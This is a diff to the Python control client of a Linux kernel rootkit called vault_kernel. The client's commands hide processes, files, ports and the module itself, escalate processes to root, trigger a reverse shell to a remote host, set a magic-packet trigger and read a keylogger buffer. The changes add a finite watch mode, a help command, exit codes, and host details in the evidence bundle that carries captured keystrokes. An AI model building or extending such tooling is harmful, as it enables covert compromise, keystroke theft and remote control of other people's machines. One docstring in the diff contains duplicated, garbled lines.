@@ -15,9 +15,10 @@ Commands:
     unhide-port <port>    Reveal a hidden port
     list [--json]         List all hidden items (PIDs, files, ports)
     stats [--json]        Show module stats (version, hooks, counts)
-    watch [--interval MS] [--once]
+    watch [--interval MS] [--once] [--count N]
                           Live view of stats + hidden list (--once: one
-                          frame, no ANSI; default refresh 1000 ms)
+                          frame, no ANSI; --count N: N frames; default
+                          refresh 1000 ms)
     give-root [pid]       Escalate a process to root (default: self)
     shell <ip:port>       Trigger reverse shell to remote host
     magic <word>          Set magic packet trigger word
@@ -36,9 +37,16 @@ Commands:
     status [--json]       Check if rootkit is loaded and show info
     version               Print client version and ioctl ABI constants
     doctor [--json]       Diagnose module/client state (lab sanity check)
+    help                  Show this help and exit
+
+Exit codes:
+    0  success
+    1  runtime error (device open, ioctl failure, empty report)
+    2  usage error (grammar, invalid values, unknown command)
 """
 
 import os
+import platform
 import sys
 import stat as stat_mod
 import struct
@@ -52,7 +60,7 @@ import argparse
 MAGIC = 0xC0
 DEVICE_PATH = "/dev/vault_kernel"
 SYSFS_MODULE = "/sys/module/vault_kernel"
-CLIENT_VERSION = "3.11"
+CLIENT_VERSION = "3.12"
 
 # Commands that NEVER open the device: safe to run without root, no
 # non-root warning (parity with the Go deviceRequired list, v3.11).
@@ -101,6 +109,21 @@ def _stop_after_arg(value):
     if iv < 1:
         raise argparse.ArgumentTypeError(
             f"--stop-after must be >= 1, got {iv}")
+    return iv
+
+
+def _count_arg(value):
+    """argparse type: frame count for `watch --count N` (v3.12).
+    Mirror of the Go parser: numeric, >= 1, so a finite watch window
+    cannot be created by accident."""
+    try:
+        iv = int(value)
+    except ValueError:
+        raise argparse.ArgumentTypeError(
+            f"invalid --count: {value!r} (frames, >= 1)")
+    if iv < 1:
+        raise argparse.ArgumentTypeError(
+            f"invalid --count: {value!r} (frames, >= 1)")
     return iv
 
 
@@ -321,17 +344,21 @@ def parse_hidden_list(report: str) -> dict:
 
 def build_capture_bundle(stats_raw: dict, hidden: dict, keylog_text: str,
                          captured_at: str, module_in_sysfs: bool,
-                         client_version: str = CLIENT_VERSION) -> dict:
+                         client_version: str = CLIENT_VERSION,
+                         hostname: str = "",
+                         kernel_release: str = "") -> dict:
     """Build the `capture` evidence bundle — mirrors buildCaptureReport()
     in the Go client (v3.9, contract pinned by tests in BOTH clients).
 
     One JSON document freezing the module state for a lab report:
     envelope keys in contractual order (schema, captured_at,
-    client_version, module_in_sysfs, stats, hidden, keylog), stats
-    reusing the `stats --json` numeric conversion with keys sorted
-    (Go's JSON encoder sorts map keys — the mirror keeps parity),
-    keylog text verbatim.  captured_at is the UTC RFC3339 instant of
-    the SNAPSHOT, taken after the buffers were read.
+    client_version, hostname, kernel_release, module_in_sysfs, stats,
+    hidden, keylog), stats reusing the `stats --json` numeric
+    conversion with keys sorted (Go's JSON encoder sorts map keys —
+    the mirror keeps parity), keylog text verbatim.  captured_at is
+    the UTC RFC3339 instant of the SNAPSHOT, taken after the buffers
+    were read.  v3.12 adds the host context (hostname, kernel_release
+    — ADDITIVE fields, the schema envelope stays at 1).
     """
     stats = {}
     for key in sorted(stats_raw):
@@ -343,6 +370,8 @@ def build_capture_bundle(stats_raw: dict, hidden: dict, keylog_text: str,
         "schema": JSON_SCHEMA_VERSION,
         "captured_at": captured_at,
         "client_version": client_version,
+        "hostname": hostname,
+        "kernel_release": kernel_release,
         "module_in_sysfs": module_in_sysfs,
         "stats": stats,
         "hidden": {"pids": hidden.get("pids", []),
@@ -416,9 +445,12 @@ def _proc_euid(pid):
 
 def _reject(condition, message):
     """Fail fast with a clear error instead of silently truncating
-    the value inside the kernel's fixed-size buffers."""
+    the value inside the kernel's fixed-size buffers.  v3.12: operand
+    validation is a USAGE failure — exit 2 on stderr (it used to exit
+    1 like a runtime error; parity with the Go usageError class)."""
     if condition:
-        raise SystemExit(f"[-] {message}")
+        print(f"[-] {message}", file=sys.stderr)
+        raise SystemExit(2)
 
 
 def parse_modinfo(output: str) -> dict:
@@ -628,7 +660,10 @@ class VaultKernelClient:
                 print("    Run with sudo.")
             elif e.errno == errno.ENOTTY:
                 print("    Module and CLI version mismatch (ioctl number).")
-            return False
+            # v3.12: a failed ioctl is a RUNTIME failure — exit 1.
+            # Before, this returned False and the command exited 0
+            # while doing nothing (the Go client always exited 1).
+            raise SystemExit(1)
 
     def _close(self):
         if self.fd is not None:
@@ -759,8 +794,10 @@ class VaultKernelClient:
         after the Nth emitted event — same farewell as the signals —
         the finite-capture-window mode for scripts."""
         if stop_after is not None and not follow:
-            raise SystemExit(
-                "[-] --stop-after requires --follow")
+            # v3.12: usage class (exit 2, stderr) — same class as the
+            # --timestamps guard (parser.error) and as the Go grammar.
+            print("[-] --stop-after requires --follow", file=sys.stderr)
+            raise SystemExit(2)
         if interval is None:
             interval = _interval_ms_to_seconds(KEYLOG_DEFAULT_INTERVAL_MS)
         self._open()
@@ -847,15 +884,27 @@ class VaultKernelClient:
             print("[-] Module visible again in lsmod")
         self._close()
 
-    def watch(self, interval_ms=WATCH_DEFAULT_INTERVAL_MS, once=False):
+    def watch(self, interval_ms=WATCH_DEFAULT_INTERVAL_MS, once=False,
+              count=None):
         """Live view: clear the screen and repaint stats + hidden list
         every interval_ms until Ctrl-C or SIGTERM (both stop cleanly
         since v3.10).  With once=True render a SINGLE frame to stdout
         without any ANSI control sequence and exit — the snapshot mode
+        for scripts and reports.  With count=N (v3.12, not with
+        --once) the loop stops after the Nth frame with the standard
+        farewell — finite watch windows for lab reports, symmetric
+        with keylog --stop-after.  Rendering lives in format_watch_panel
+        (pure, unit-tested); this loop only owns the refresh cadence,
+        the prev-stats threading for the change annotations, and
         for scripts and reports.  Rendering lives in format_watch_panel
         (pure, unit-tested); this loop only owns the refresh cadence,
         the prev-stats threading for the change annotations, and
         console cursor restoration."""
+        if once and count is not None:
+            # v3.12: usage class — one frame is not a window.
+            print("[-] --once and --count are mutually exclusive",
+                  file=sys.stderr)
+            raise SystemExit(2)
         self._open()
         prev_stats = None
         try:
@@ -876,6 +925,7 @@ class VaultKernelClient:
                 return
             _install_term_handler()
             print("\x1b[?25l", end="", flush=True)  # hide cursor
+            frames = 0
             while True:
                 stats_buf = bytearray(4096)
                 if not self._ioctl(IOCTL_GET_STATS, stats_buf):
@@ -893,6 +943,12 @@ class VaultKernelClient:
                 # ANSI: clear screen + home cursor, then the frame.
                 print("\x1b[2J\x1b[H" + panel, end="", flush=True)
                 prev_stats = stats
+                frames += 1
+                # v3.12: finite watch window — same farewell as the
+                # signals after the Nth frame.
+                if count is not None and frames >= count:
+                    print("[*] watch stopped")
+                    return
                 time.sleep(_interval_ms_to_seconds(interval_ms))
         except KeyboardInterrupt:
             print("\n[*] watch stopped")
@@ -1003,7 +1059,9 @@ class VaultKernelClient:
             bundle = build_capture_bundle(
                 stats_raw, hidden, keylog_text,
                 time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-                os.path.isdir(SYSFS_MODULE))
+                os.path.isdir(SYSFS_MODULE),
+                hostname=platform.node(),
+                kernel_release=platform.release())
             payload = json.dumps(bundle, indent=2)
             if out and to_stdout:
                 # v3.11: file AND pure-JSON stdout — the one-line
@@ -1080,6 +1138,9 @@ def main():
                     help="refresh interval in ms (default 1000, min 50)")
     sp.add_argument("--once", action="store_true",
                     help="render a single frame and exit (no ANSI control)")
+    sp.add_argument("--count", type=_count_arg, default=None, metavar="N",
+                    help="render N frames and exit (finite window; "
+                         "mutually exclusive with --once)")
 
     sp = subparsers.add_parser("shell", help="Trigger reverse shell")
     sp.add_argument("target", type=_shell_target_arg,
@@ -1117,6 +1178,7 @@ def main():
                     help="with --out: ALSO print the JSON to stdout "
                          "(the summary line moves to stderr)")
     subparsers.add_parser("keylog-clear", help="Clear keylogger buffer")
+    subparsers.add_parser("help", help="Show the full help and exit")
     subparsers.add_parser("version", help="Print client version and ioctl ABI")
     subparsers.add_parser("hide-module", help="Hide from lsmod")
     subparsers.add_parser("unhide-module", help="Reveal in lsmod")
@@ -1129,8 +1191,11 @@ def main():
     args = parser.parse_args()
 
     if args.command is None:
-        parser.print_help()
-        sys.exit(1)
+        # v3.12: a bare invocation is a USAGE error — exit 2 with the
+        # help on STDERR (parity with the Go client and with argparse's
+        # own missing-subcommand behaviour; it used to be exit 1).
+        parser.print_help(file=sys.stderr)
+        sys.exit(2)
 
     # v3.11: the non-root warning only fires for commands that open the
     # device (parity with the Go deviceRequired list) and goes to
@@ -1146,7 +1211,11 @@ def main():
     client = VaultKernelClient()
 
     try:
-        if args.command == "status":
+        if args.command == "help":
+            # v3.12: explicit help subcommand (exit 0, stdout) — the Go
+            # client has it and its own error message recommends it.
+            parser.print_help()
+        elif args.command == "status":
             client.status(as_json=args.as_json)
         elif args.command == "doctor":
             run_doctor(as_json=args.as_json)
@@ -1171,7 +1240,9 @@ def main():
         elif args.command == "watch":
             # --interval is documented in ms (like the Go client);
             # _interval_ms_to_seconds clamps to the 50 ms floor.
-            client.watch(interval_ms=args.interval, once=args.once)
+            # v3.12: --count (finite watch window) joins the call.
+            client.watch(interval_ms=args.interval, once=args.once,
+                         count=args.count)
         elif args.command == "shell":
             client.shell(args.target)
         elif args.command == "magic":
